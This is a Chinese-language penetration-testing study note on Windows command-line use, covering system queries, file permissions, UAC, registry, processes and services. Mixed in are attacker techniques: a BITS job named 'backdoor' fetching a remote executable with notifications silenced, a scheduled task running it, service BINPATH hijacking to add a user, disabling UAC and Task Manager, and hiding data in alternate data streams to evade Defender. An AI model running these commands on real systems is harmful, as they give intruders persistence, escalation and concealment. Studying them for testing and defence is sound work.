渗透测试过程中会，一旦突破边界，进入到一个系统中，就会遇到提权问题。此时我们就会用到Windowns系统命令。

---


# 重要的目录

+ `AppDate\Roaming`

  - `AppDate`目录是一个隐藏文件，位于 `C:\User\<username>` 下
  - `Roaming`目录是一个漫游目录，在域环境下，当用户通过不同终端登陆域内同一个用户时，会产生该目录。
  - 同步用户配置文件。
+ `C:\Windws`

  > `C:\Windws` 有系统动态连接库，当软件需要的时候可以在动态连接库调用库文件，当进行AV绕过时会用到。
  >

  - `System32` ：32位系统所有动态连接库文件都在此，如果64位系统，64位库文件会保存在此。
  - `System` ：64位系统中的32位动态连接库
  - `SysWOW64` ：64位系统运行32位应用程序时调用的动态连接库。

---

# 系统信息查询

## 系统信息查询

- CMD命令行

```cmd
systeminfo
```

`systeminfo` 支持远程查看其他主机信息， 如果当前用户没有权限，可以指定有权限的用户。

```cmd
systeminfo /s  <host1>  /U  domain\user  /P password
```

- Powershell 命令行

```powershell
get-Computerinfo
```

---

## 环境变量查询

- CMD 命令行

查看默认环境变量

```cmd
set
```

> USERNAME=user   # 调用用户名
> SystemRoot=C:\Windows  # 调用Windows目录
> PATHEXT=        # 指定默认可执行程序的扩展名
> Path=         # 指定环境变量

## 利用环境变量查询系统信息

windows 可以利用环境变了查询系统信息，

例：如果查询OS信息，就在 `%%` 中间写 `OS`

```cmd
echo %OS%
```

例：如果查看临时目录信息，就在 `%%` 中间写 `TEMP`

```cmd
echo %TEMP%
```

---

## 利用第三方工具包查看系统信息

`SysinternalsSuite` 是微软合作伙伴开发的 `powershell`环境下的一个功能强大的工具包，可以用来查看系统信息。

- 使用方式：解压后，直接在该工具包目录下执行对应的程序。
- 例：查看64位系统的系统信息

  在 `SysinternalsSuite`目录下执行以下命令

```powershell
.\PsInfo64.exe
```

---

# powershell 取消图形画对话框

只有命令行的时候，无法使用图形化界面点击确认，这时候就需要命令行取消图形对话框

- 例：

```powershell
.\accesschk64.exe  /accepteula
```

---

# 文件基本操作

# Powershell

微软开发了powershell 中类linux命令，大部分命令是与linux保持一致的。

- 跳转 ：`cd`
- 创建目录 ： `mkdir`
- 列出目录中文件： `ls`
- 查看文件内容： `type`
- 添加文件内容：`echo`
- 拷贝(复制) ：`copy`

---

## CMD 命令行常用



- 改文件名：`rename`
- 创建目录 ： `mkdir`
- 移动文件 ：`move`
- 文件的比较： `fc`



- type  ： 查看文件内容

```cmd
type  local.txt
```



### 列出目录内容

- dir  列出目录内容

```cmd
dir    /s  *.exe
```

> /a  参数的作用是列出隐藏文件
>
> /s  列出子目录
>
> 也可以用通配符指定文件类型或文件名称

- 列出目录树

```cmd
tree  
```

> tree  /f  # 不但列出目录也列出目录中的文件

- forfiles

`forfiles` 是一个windows中类似linux系统命令 `find` 的命令，但是目前来说还没有 `find`强大

例： 在 `c:\windows`下找名为 `notepad.exe`的文件，并打印出它完整的路径 ` echo @PATH`

```cmd
forfiles /p  c:\windows  /s /m  notepad.exe  /c "cmd /c echo @PATH"
```

例：在 `c:\windows`下找到最后更改时间为2023年1月1日后修改的exe，并打印它的完整路径。

```cmd
forfiles /m *.exe /d 2023/1/1 /s  /p  c:\windwos  /c  "cmd  /c  echo  @path"
```

> /p  # 指定起始目录
>
> /s  # 列出所以子目录
>
> /m  # 指定文件名
>
> /c  # 对前面的命令结果执行后面的命令
> /d  # 指定最后修改时间



### 创建连接（快捷方式）

与linux 中一样，windows 也可以创建软、硬连接。

- 创建软连接

```cmd
mklink   link1   a.txt
```

- 创建硬连接

```cmd
mklink  /h  link2  b.txt
```

---

# 系统权限操作

## 查看用户账号

- `whoami` ： 查看用户名
- `whoami /user`  ： 查看用户SID
- `net  user <username>`  : 查看用户信息，**包括用户组**

## 查看内建账号

```cmd
wmic  sysaccount 
```

## 添加账号

想要添加账号，必须有administator权限，如何获取administrator权限详见 [UAC](#uac)。

```cmd
net user sys  /add
```

## UAC

UAC ：用户账号控制，当普通用户以管理员运行程序时，会弹出UAC窗口。

>
>
![1691221541470](image/Security.OSCP.Windows命令/1691221541470.png)  --------  ![1691221238234](image/Security.OSCP.Windows命令/1691221238234.png)




系统会给在administrator用户组中的非administrator用户，发两个身份令牌，一个是普通用户令牌，一个是administrator令牌。

非administrator用户，即便在administrator用户组中，也不能获取最高权限（对系统级别进行操作），当想以管理员身份运行一个程序时，需要手动选择。

- 查看用户权限

```powershell
whoami   /grpups
```

> Mandatory Lable : 强制标签
>
> 当 `Mandatory Lable` 值为 `High`时，用户为高权限（拥有管理员权限）
>
>当 `Mandatory Lable` 值为 `Medium`时，用户为中等权限（管理员组中的非管理员用户）

### 禁用UAC 
可以从注册表禁用UAC,要想使之生效，在设置完成后需要重启系统。

- 单击“开始”，单击“运行”，键入 regedit，然后按 Enter。

-  找到并单击下面的注册表子项
```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```
- `EnableLUA` 的值改为`'0'`
- 重启系统

---

## 以管理员权限运行某个程序

RUNAS使用示例：
> 搬运：https://blog.csdn.net/annita2019/article/details/113621931

- 使用本机上的Administrator管理员身份执行CMD:

/noprofile为不加载该用户的配置信息。

```cmd
runas /noprofile /user:mymachine\administrator cmd
```
- 使用本机上的admin身份扫行msc控制台。
 
/profile为指定加载用户配置文件。 /env 表示使用当前环境。
```cmd
runas /profile /env /user:mydomain\admin “mmc %windir%\system32\dsa.msc”
```
- 使用域用户身份运行，并指定使用notepad打开my file.txt文档。

```cmd
runas /env /user:user@domain.microsoft.com “notepad \”my file.txt\””
```

- 使用域管理员身份安装共享盘的软件
    - 打开cmd
    ```cmd
    C:\Users\wuqy>runas /env /user:administrator@zhprny.com cmd   
    输入 administrator@zhprny.com 的密码:
    试图将 cmd 作为用户 "administrator@zhprny.com" 启动...
    ```
    - 使用域管理员身份给用户安装FileZilla_3.52.0.5_win64-setup.exe
    ```mcd
    C:\Users\wuqy>runas /env /user:administrator@zhprny.com \\192.168.1.51\netlogon\SOFT\FileZilla_3.52.0.5_win64-setup.exe
    输入 administrator@zhprny.com 的密码:
    试图将 \\192.168.1.51\netlogon\SOFT\FileZilla_3.52.0.5_win64-setup.exe 作为用户
    "administrator@zhprny.com" 启动...
    C:\Users\wuqy>
    ```


### 实际应用实例：

- 以管理员身份运行IE浏览器。
```cmd
@echo off
runas /user:Colin-PC\Administrator /sa “C:\Program Files\Internet Explorer\iexplore.exe”
```

将命令保存为批处理后，只要在用户电脑上运行这个批处理（第一次输入管理员密码），以后用户只要双击该文件就可会以管理员身份执行命令中所指定的程序了。

- 将批处理文件封装为.exe的文件，让用户不能进行修改。

下载一个“Bat To Exe Converter”程序：http://pan.baidu.com/s/1sjNM8Lf

![1691226413954](image/Security.OSCP.Windows命令/1691226413954.png)


---
## 更改文件权限

在windows系统中的ntfs文件系统中，一般一个子文件会自动继承父文件权限。
在攻击过程中一般会在某个盘符或目录下创建一个目录或文件，禁止继承，这样来避免用户进行文件读取和操作。

### 命令行进行文件权限操作

- 查看文件权限

```cmd
icacls <filename>
```
> (I) : 表示此权限是继承权限
>
> (F) : 表示完全控制权限
>

![1691222496771](image/Security.OSCP.Windows命令/1691222496771.png)

- 添加权限

例：  为所有人添加完全控制权限
```cmd
icacls  <filename>  /grant  everyone:f
```
![1691222528768](image/Security.OSCP.Windows命令/1691222528768.png)

---
# 进程管理
## 进程查看
```cmd
tasklits
```

## 杀死进程

- SysinternalsSuite 工具

```cmd
pskill  PID
```

- 自带命令

```cmd
taskkill  PID 
```
其他使用方式可以用 `taskkill  /？` 查询，结果如下图：
![1691223075455](image/Security.OSCP.Windows命令/1691223075455.png)

## 查看进程加载的动态连接库

- 不做筛选查看
```cmd
Listdlls64.exe
```
- 查看没有签名的动态连接库

```cmd
Listdlls64.exe  -u
```
>没签名，`Verified` 参数的值为 `Unsigned`

![1691223392641](image/Security.OSCP.Windows命令/1691223392641.png)

---
# 注册表

图形界面运行`ragedit` 打开注册表编辑器。注册表由 `键-子键-值` 组成。

windows 大多数系统配置和某些软件的配置信息，使用计算机过程中的的日志信息都会保存在注册表中。


键 `HKEY_LOCAL_MACHINE` 下 `SAM` 、`SECURITY`、`SOFTWARE`、`SYSTEM` 这几各子键，对于的系统注册表数据库文件位置在`C:\System32\config` 下

- SAM 键 ：windows系统账户信息（普通用户想要看到，需要获取权限）。

## 命令行操作注册表

- 查看键值

查看当前用户下自启动程序

```cmd
reg  query hkcu\software\microsoft\windows\currentversion\run
```

查看整个系统层面的自启动程序

```cmd
reg  query hklm\software\microsoft\windows\currentversion\run
```
- 删除键值
```cmd
reg delete  <键值>
```
- 添加键值

```cmd
reg   add  <键值>
```

- 导出键值

```cmd
reg  export
```

### 例：通过注册表添加键值来禁用任务管理器(需要先获取管理员权限)

```cmd
reg  add "hkcu\software\microsoft\windows\currentversion\policies\system"  /v  disabletaskmgr /t  reg_dword /d "1"  /f
```

![1691226521926](image/Security.OSCP.Windows命令/1691226521926.png)

---
# BITS Job

BITS 是一个系统的自动化任务的功能，用来进行远程数据传输，包括Update下载补丁也是通过BITS实现的。
攻击者可以利用BITS 来建立自动化任务。

```powershell

bitsadmin  /create  backdoor   
# 创建自动化任务 
bitsadmin /addfirel backdoor  "http://1.1.1.1/backdoor.exe"  "c:\users\public\sshtool.exe"  
 # 添加任务内容
```

##  关闭系统提示

一般当BITS Job 执行完后，会产生系统通知，攻击人员需要将通知关闭，避免运维人员发现

```powershell
bitsadmin  /setnotifycmdline  backdoor 'c:\users\public\sshtool.exe' 'NUL' 
```

## 设置周期执行

下面命令的意思是：设置60分钟执行一次

```powershell
bitsadmin  /setminretrydelay "backdoor"  60  
```

## 启用 BITS Job

设置完成后要将BITS Job 启用

```powershell
bitsadmin  /resume backdoor
```

## 查看 BITS Job

- 查看BITS Job 列表
```powershell
bitsadmin  /list
```
- 查看所有用户 BITS Job 详细信息
```poershell
bitsadmin /list  /alluser   /verbos
```
---

# 计划任务

- 查看计划任务

```powershell
schtasks
```

- 创建几乎任务

```powershell
schtasks  /create  /sc    weekly   /d mon  /tn   backup  /tr  c:\users\public\sshtool.exe  /st 2:00
```

>

> /sc :  指定频率
>
> /d  ： 指定天（星期几）
>
> /tr :  指定执行命令
>
> /st  :指定时间

---
# ADS-可选数据流
windows 的ntfs系统文件系统中每个文件有一个默认数据流，除了默认数据流之外还可以绑定额外的数据流。 

绑定额外数据流，可以隐藏额外数据流内容，这样直接查看文件内容就只能看到默认数据流的内容。例子如下：
- 文件写入默认数据流
```cmd
echo aaa > a.txt
```
- 文件写入额外数据流
```cmd
echo bbb > a.txt:hide
```
- 查看文件（只能看到默认数据流）
```cmd
type  a.txt
```

- 查看额外数据流
```cmd
more  < a.txt:hide
```
>
> 提示： 如果插入明显的恶意代码，有可能被windowsdefer杀掉



# 防火墙

- 查看防火墙规则

```cmd
netsh  advfirewall show allprofiles
```

- 添加防火墙规则

```cmd
netsh advfirewall  firewall   add  rule  name="denyping" dir=in action=block protocol=icmpv4 remoteip=192.168.18.1
```


- 删除防火墙规则
```cmd
netsh advfirewall  firewall delete ....
```

# 服务控制

- 查看进程对应的服务

```cmd
tasklist /svc
```

- 启动服务

```cmd
sc  start  <服务名称>
```

- 停止服务

```cmd
sc  stop  <服务名称>
```
- 简略查询服务状态
 
 该命令会显示当前服务是否启动及是否有权限停止

```cmd
sc  qery  <服务名>
```
>STATE : 运行状态、是否有停止权限
>
>
- 详细查询服务状态

 该命令会显示当前服务调用什么命令

```cmd
sc  qc  <服务名>
```
> START_TYPE(启动类型) : AUTO_START(自动启动)  
> 
>BINARY_PATH_NAME (启动时调用的命令) 
> 
>SERVICE_START_NAME（启动该服务的用户）：LocalSystem（本地system用户，系统最高权限） 

如果有完全控制的权限，就可以将该服务替换成我们想让它运行的程序(将名称改为此程序)

- 修改服务启动时调用项

如果有权限，修改此项后，该服务再次启动会调用修改后的命令

```cmd
sc config <服务名> BINPATH="net user ww  /add"
```
